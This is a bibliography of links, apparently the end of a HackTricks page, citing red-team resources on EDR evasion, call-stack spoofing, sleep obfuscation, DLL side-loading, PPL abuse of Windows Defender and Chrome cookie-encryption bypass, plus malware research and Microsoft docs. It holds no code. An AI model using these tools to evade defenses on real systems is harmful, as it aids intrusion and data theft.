- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
